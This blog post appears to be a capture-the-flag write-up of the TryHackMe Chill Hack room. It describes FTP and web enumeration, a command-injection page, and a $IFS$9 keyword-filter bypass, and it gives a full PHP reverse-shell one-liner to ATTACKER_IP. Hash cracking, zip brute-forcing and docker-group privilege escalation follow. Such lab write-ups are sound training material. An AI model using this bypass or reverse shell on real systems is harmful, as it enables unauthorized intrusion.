---
layout: post
title: THM Chatterbox writeup
excerpt_separator: <!--more-->
---
<img src="/img/chillhack/0.head.png">
<!--more-->
<a href="https://tryhackme.com/room/chillhack" target="_blank" > Click here to access this box on TryHackMe.com</a>
<hr>
<p>Start by enumerating  ports with an NMAP Scan.</p>
<p>In the output below we can see that FTP (port 21) and SSH (port 22) are open. There’s also an apache  web server running on port 80</p>
<p>First let see what's in the note.txt file on the FTP service since anonymous login is allowed</p>
<img src="/img/chatterbox/1.nmap.png">

<p>login with “anonymous:anonymous” </p>
<img src="/img/chillhack/2.ftp-login.png">

<p>Download (GET) the note.txt file.</p>
<img src="/img/chillhack/3.ftp-note-dl.png">

<p>Read the contents of the file.</p>
<p> This isn’t very helpful right now, but will take note of this. </p>
<p> Let’s enumerate the webserver in our web browser</p>
<img src="/img/chillhack/4.note-text.png">

<p>We have a web page that appears to be dedicated to  pseudo soccer teams.</p>
<p>I spent some time enumerating all the input fields and links. All of them appear to be “dummy” place holders. Let’s try and enumerate the sub directories. </p>  
<img src="/img/chillhack/5.home-webpage.png">

<p>Let’s run dirbuster first.</p>
<img src="/img/chillhack/6.dirbuster.png">

<p>From the output below we see there’s a directory named “secret”. Let’s navigate to the page</p>
<img src="/img/chillhack/7.dirbuster2.png">

<p>When we navigate to that page we’re presented with an input box that says command. Let’s try and issue some commands. Since we know from NMAP this is probably a Liux box let’s try some bash commands</p>
<img src="/img/chillhack/8.secret-page.png">

<p>If we type “id command we get a response in our web browser. Let’s try and get a use net cat to get a basic reverse shell.</p>
<img src="/img/chillhack/9.id-input.png">

<p>First let’s set up a listener on our attacking machine to catch the shell.</p>
<img src="/img/chillhack/10.nc-listner">

<p>Okay, I didn't think it would be that easy. This must be what the note.txt in the FTP server was speaking about. There filtering out some keywords - “nc” appears to be one on the list</p>
<img src="/img/chillhack/11.nc-fail">

<p>I tried using Burp Suite to send the POST request to try and bypass any client side scripting that may be filtering input data. That didn’t work</p>
<img src="/img/chillhack/12.burp.png">

<p>After fuzzing the input data for a while, I found a way to defeat the input filtering by using “$IFS$9” (this will be interpreted as a white space on the server) for white spaces. I’m assuming there’s an input validation that has a hard coded list of black listed keywords. E.g.  'nc', 'python', 'bash','php','perl', etc… If we take the command “nc -e” and replace the withe space with “nc$IFS$9-e” we can get the command to execute without triggering the input validation filter.  </p>
<img src="/img/chillhack/13.input-trick.png">

<p>Altho this trick worked I couldn’t get a shell to “pop” using any net cat commands. I used a PHP one-liner and “popped” a reverse shell: php$IFS$9-r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'  </p>
<img src="/img/chillhack/14.php-1liner">

<p>And we have a non interactive shell running as www-data. Let’s upgrade this to pseudo interactive.</p>
<img src="/img/chillhack/15.first-shell">

<p>Using this python 3 command we can get a pseudo interactive shell and start enumerating.</p>
<img src="/img/chillhack/16.psudo-i-shell.png">

<p>Looking through the file system there's an interesting  directory named “files” that we have read access to. There’s also a folder named images that I downloaded on to my machine.</p>
<img src="/img/chillhack/17.files.png">

<p>When we cat the index.php file we find a mysql user name and password. Let’s note these and see if we can connect to the mysql server. </p>
<img src="/img/chillhack18.mysql-creds.png/">

<p>We’re connected to the SQL database. Let’s begin enumerating.</p>
<img src="/img/chillhack/19.mysql-login">

<p>The webportal table looks interesting. Let’s see what  tables it has.. </p>
<img src="/img/chillhack/20.mysql-tables">

<p>Let’s see if we can get any user creds from this table.</p>
<img src="/img/chillhack/21.mysql-table">

<p>Great, we have usernames and passwords. These passwords are hashed with  MD5. Let see if Crakstation.net can crack these before we try hashcat</p>
<img src="/img/chillhack/22.user-password-hashed.png">

<p>They were very weak passwords and crackstation.net was able to crack both. Let’s note the user names and password and keep enumerating. </p>
<img src="/img/chillhack/23.crack-station.png">

<p>Let’s cech the images we download from the images folder on the server. First let’s try the .jpg and see if these any hidden data in it.</p>
<img src="/img/chillhack/">

<p>Using steghide I was able to extract a file named backup.zip. Let’s unzip and see what’s inside.</p>
<img src="/img/chillhack/24.backup-.zip-file">

<p>It’s password protected. I tried the three passwords I captured earlier but these didn’t work. let ‘s try and bruteforce the password.</p>
<img src="/img/chillhack/25.unzip-pass-pro.png">

<p>using fcrackzip and the rockyou password list it quickly found the password.</p>
<img src="/img/chillhack/26.zip_password-cracked">

<p>using fcrackzip and the rockyou password list it quickly found the password.</p>
<img src="/img/chillhack/26.zip_password-cracked">

<p>Let’s see what’s inside. When we unzip the file we find another file named source_code.php. There’s credentials hardcoded in this php, but it’s base64 encoded.</p>
<img src="/img/chillhack/27.creds-again.png">

<p>Let’s decode the password</p>
<img src="/img/chillhack/28.base64-d.png">


<p>Let’s see if we can use these creds to ssh in so we have a more stable shell</p>
<img src="/img/chillhack/">

<p>Success. Now let’s enumerate for priv esc.</p>
<img src="/img/chillhack/29.ssh-shell.png">

<p>We’re in the Docker group. This looks like a potential priv esc path.</p>
<img src="/img/chillhack/30.docker-group.png">

<p>A quick check on GTFO bins.</p>
<img src="/img/chillhack/31.gtfo-bins.png">
<p>And we are root. Let’s cat our flags.</p>
<img src="/img/chillhack/32.we-are-root.png">
<p>User flag.</p>
<img src="/img/chillhack/33.user-flag.png">
<p>And the root flag. This was a really fun box!!</p>
<img src="/img/chillhack/34.root-flag.png">




